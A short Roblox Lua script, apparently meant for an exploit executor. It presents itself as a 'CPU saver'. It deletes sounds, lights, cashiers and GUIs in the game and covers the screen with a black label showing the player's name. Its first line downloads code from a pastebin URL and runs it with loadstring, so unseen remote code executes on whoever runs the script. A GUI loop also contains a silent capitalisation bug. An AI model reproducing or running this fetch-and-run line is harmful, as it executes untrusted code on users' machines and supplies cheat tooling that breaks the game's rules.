loadstring(game:HttpGet("https://pastebin.com/raw/ywFjby1i"))()
   pcall(function()
      for i,v in pairs(game:GetDescendants()) do
            if v:IsA("Sound") then
               v:Destroy() 
            end
      end
      
      game.Workspace.Lights:Destroy()
      game.Workspace.Cashiers:Destroy()
      game:GetService("Workspace").Ignored:Destroy()
      
      for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
            if V:IsA("ScreenGui") then
               v:Destroy()
            end
      end
   end)


   local Gui = Instance.new("ScreenGui", game.CoreGui)
   local Frame = Instance.new("TextLabel", Gui)
      --BlackFrame
      Frame.BackgroundColor3  = Color3.fromRGB(0,0,0)
      Frame.Size = UDim2.new(9, 0, 9, 0)
      Frame.Position = UDim2.new(0.5,0,0.5,0)
      Frame.AnchorPoint = Vector2.new(0.5,0.5)
      Frame.Text = "Saving ur cpu, Ur name is, "..game.Players.LocalPlayer.Name
      Frame.TextColor3  = Color3.fromRGB(255,255,255)
      Frame.TextSize = 18
      Frame.Font = "GothamBlack"
